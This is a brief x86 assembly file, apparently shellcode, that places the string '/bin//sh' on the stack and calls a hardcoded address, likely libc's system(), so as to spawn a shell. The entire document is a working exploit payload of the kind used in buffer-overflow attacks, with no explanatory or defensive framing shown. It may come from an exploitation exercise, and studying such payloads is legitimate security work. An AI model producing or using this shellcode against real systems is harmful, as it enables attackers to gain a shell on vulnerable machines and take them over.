; shellcode_sh.asm
xor eax, eax
push eax
push 0x68732f2f ;hs//
push 0x6e69622f ;nib/
mov eax, esp
push eax
mov ebx, 0xf7e2bb30
call ebx
